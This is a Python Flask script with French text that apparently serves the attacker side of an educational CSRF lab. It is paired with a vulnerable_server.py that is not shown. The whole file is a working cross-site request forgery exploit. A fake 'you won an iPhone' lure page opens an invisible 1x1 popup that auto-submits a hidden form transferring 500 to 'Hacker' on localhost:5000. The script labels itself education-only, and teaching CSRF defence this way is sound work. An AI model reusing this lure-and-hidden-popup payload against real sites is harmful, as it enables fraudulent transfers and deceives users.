# /// script
# dependencies = [
#   "flask",
# ]
# ///

from flask import Flask

app = Flask(__name__)

ATTACKER_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Félicitations! Vous avez gagné!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        .container { max-width: 600px; margin: 0 auto; }
        h1 { font-size: 3em; margin-bottom: 20px; }
        .prize { font-size: 5em; margin: 30px 0; }
        .message { font-size: 1.2em; margin: 20px 0; }
        .button {
            display: inline-block;
            padding: 15px 40px;
            background: #ffd700;
            color: #333;
            text-decoration: none;
            border-radius: 30px;
            font-size: 1.2em;
            font-weight: bold;
        }
        .warning {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: rgba(0,0,0,0.8);
            padding: 15px;
            border-radius: 10px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>FÉLICITATIONS!</h1>
        <div class="prize">🏆</div>
        <p class="message">
            Vous êtes notre 1.000.000ème visiteur!<br>
            Vous avez gagné un iPhone 15 Pro!
        </p>
        <a href="#" class="button">Réclamer mon prix</a>
    </div>

    <script>
        // Ouvre un popup minuscule qui effectue l'attaque CSRF
        // Le popup se ferme automatiquement, l'utilisateur ne remarque presque rien
        window.onload = function() {
            var popup = window.open('/attack', 'csrf', 'width=1,height=1,left=-100,top=-100');
            // Fermer le popup après 1 seconde
            setTimeout(function() {
                if (popup) popup.close();
            }, 1000);
        };
    </script>

    <div class="warning">
        ⚠️ <strong>Démonstration CSRF</strong> - Cette page ouvre un popup invisible
        qui soumet un formulaire vers localhost:5000 pour effectuer un virement frauduleux.
    </div>
</body>
</html>
"""


ATTACK_PAGE = """
<!DOCTYPE html>
<html>
<body>
    <form id="csrf-form" method="POST" action="http://localhost:5000/transfer">
        <input type="hidden" name="to" value="Hacker">
        <input type="hidden" name="amount" value="500">
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
"""


@app.route("/")
def index():
    return ATTACKER_PAGE


@app.route("/attack")
def attack():
    return ATTACK_PAGE


if __name__ == "__main__":
    print("=" * 60)
    print("SERVEUR ATTAQUANT CSRF - ÉDUCATION UNIQUEMENT!")
    print("=" * 60)
    print("\n1. Assurez-vous que vulnerable_server.py tourne sur le port 5000")
    print("2. Ouvrez http://localhost:5001 pour déclencher l'attaque")
    print("=" * 60)
    print("\n")
    app.run(port=5001)
